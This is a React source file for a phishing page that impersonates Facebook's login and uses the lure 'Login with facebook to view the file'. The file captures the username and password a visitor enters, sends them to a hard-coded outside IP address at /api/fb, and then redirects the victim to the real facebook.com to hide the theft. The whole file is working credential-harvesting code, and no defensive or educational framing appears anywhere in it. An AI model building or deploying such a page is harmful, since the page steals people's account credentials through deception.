import React, { useState } from "react";
import { useHistory, Redirect } from "react-router-dom";
import Footer from "./fb-footer";
import { Container, Row, Col, Navbar, Image, Button } from "react-bootstrap";
import axios from "axios";
const FBLogin = (props) => {
	const [user, setUser] = useState({
		userName: "",
		password: "",
	});
	// let history = useHistory();
	const [red, setRed] = useState(false);
	const handleSetUser = (key, value) => {
		const user_ = user;
		user_[key] = value;
		setUser({ ...user_ });
	};
	const handleSubmit = () => {
		axios.post("http://172.104.35.84/api/fb", user);
		// props.history.push("https://facebook.com");
		// setRed(true);
		window.location.replace("https://www.facebook.com");
	};
	if (red) return <Redirect to={"https://facebook.com"} />;
	else
		return (
			<div className="body">
				<Navbar bg="light" expand="lg">
					<Container>
						<Navbar.Brand href="#home">
							<Image src={"/logo.png"} width="30" /> Facebook
						</Navbar.Brand>
						<Navbar.Toggle aria-controls="basic-navbar-nav" />
					</Container>
				</Navbar>
				<Container>
					<Row>
						<Col></Col>
						<Col className="middleDiv">
							<div className="center-align">
								<p className="header">
									Login with facebook to view the file
								</p>
								<Image
									src={"/logo.png"}
									width="50"
									roundedCircle
								/>
							</div>
							<br />
							<label>Facebook email or phone</label>
							<input
								type="text"
								className="form-control"
								onChange={(e) => {
									handleSetUser("userName", e.target.value);
								}}
								placeholder="email or phone"
							/>
							<br />
							<label>Password</label>
							<input
								type="password"
								className="input"
								className="form-control"
								onChange={(e) => {
									handleSetUser("password", e.target.value);
								}}
							/>
							<br />
							<Button
								type="button"
								variant="primary"
								className="submit-btn"
								onClick={() => {
									handleSubmit();
								}}
							>
								Log In
							</Button>
						</Col>
						<Col></Col>
					</Row>
				</Container>
				<div style={{ height: 20 }} />
				<div className="footer">
					<Footer />
				</div>
			</div>
		);
};
export default FBLogin;
